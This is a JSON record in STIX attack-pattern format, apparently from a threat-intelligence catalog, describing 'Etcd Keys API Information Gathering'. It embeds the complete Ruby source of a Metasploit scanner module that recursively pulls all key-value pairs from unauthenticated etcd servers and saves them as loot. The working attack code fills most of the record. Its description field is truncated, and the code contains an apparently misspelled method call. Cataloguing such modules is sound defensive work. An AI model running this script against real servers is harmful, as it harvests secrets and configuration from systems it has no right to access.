{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--22a41ae6-c491-4088-a3ff-979b731764fb",
    "created": "2024-08-14T16:31:17.841058Z",
    "modified": "2024-08-14T16:31:17.841062Z",
    "name": "Etcd Keys API Information Gathering",
    "description": "( This module queries the etcd API to recursively retrieve all of the stored key value pairs.  Etcd by default does not utilize authentication. ) 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/etcd/open_key_scanner.rb",
            "external_id": "open_key_scanner.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Etcd\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Etcd Keys API Information Gathering',\n      'Description' => %q(\n        This module queries the etcd API to recursively retrieve all of the stored\n        key value pairs.  Etcd by default does not utilize authentication.\n      ),\n      'References' => [\n        ['URL', 'https://gcollazo.com/the-security-footgun-in-etcd/']\n      ],\n      'Author' => [\n        'Giovanni Collazo <hello@gcollazo.com>', # discovery\n        'h00die' # msf module\n      ],\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => \"Mar 16 2018\"\n    )\n  end\n\n  def run_host(_target_host)\n    path = normalize_uri(target_uri.to_s, 'v2/keys/?recursive=true')\n\n    banner = fingerprint_service(target_uri.to_s)\n    vprint_status(\"#{peer} - Collecting data through #{path}...\")\n    res = send_request_raw(\n      'uri'    => path,\n      'method' => 'GET'\n    )\n\n    # parse the json if we got a good request back\n    if res && res.code == 200\n      begin\n        response = res.get_json_document\n        store_loot('etcd.data', 'text/json', rhost, response, 'etcd.keys', 'etcd keys')\n      rescue JSON::ParserError => e\n        print_error(\"Failed to read JSON: #{e.class} - #{e.message}}\")\n        return\n      end\n      print_good(\"#{peer}\\nVersion: #{banner}\\nData: #{JSON.pretty_generate(response)}\")\n    elsif res\n      vprint_errord(\"Invalid response #{res.code} for etcd open keys response\")\n      return\n    else\n      verbose_error(\"No response for etcd open keys probe\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "\"Mar 16 2018\""
}